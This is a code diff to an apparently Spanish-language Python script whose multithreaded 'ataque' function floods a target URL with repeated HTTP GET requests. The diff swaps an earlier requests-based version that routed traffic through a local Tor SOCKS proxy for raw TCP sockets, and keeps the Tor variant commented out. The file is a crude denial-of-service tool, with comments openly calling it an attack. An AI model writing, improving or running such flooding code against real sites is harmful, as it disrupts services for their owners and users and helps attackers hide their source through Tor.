@@ -3,11 +3,15 @@
 import sys
 import threading
 import requests
+import socket
+import re
 
 # Variables globales que indican los parametros a usar
 cantidad_hilos = 1
 cantidad_repeticiones = 10
 url = None
+
+puerto = 80
 
 # Lista de hilos que habran trabajando.
 hilos = []
@@ -49,6 +53,19 @@ def manejar_parametros():
 # Esta funcion perpetra el ataque y es asociada con cada hilo, por lo que cada hijo ejecuta esta funcion.
 def ataque(id):
 
+    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    client.connect((url,puerto))
+
+    mensaje = "GET / HTTP/1.1\r\nHost: " + url + "\r\n\r\n"
+
+    for i in range(cantidad_repeticiones):
+
+        client.send(mensaje.encode('utf-8'))
+        print("Hilo %10d solicitando por %10d vez." % (id+1, i+1))
+
+
+    # Este codig sirve, solo que no con coneccion por sockets y protocolo TCP, usa requests de python.
+    """
     session = requests.session()
     session.proxies = {}
     session.proxies['http'] = 'socks5h://localhost:9050'
@@ -61,7 +78,7 @@ def ataque(id):
         # Aca se puede imprimir lo que se desee de la pagina, en este caso, indicamos
         # cual hilo esta atacando por cual vez.
         print("Hilo %10d solicitando por %10d vez." % (id+1, i+1))
-
+    """
 
 
 
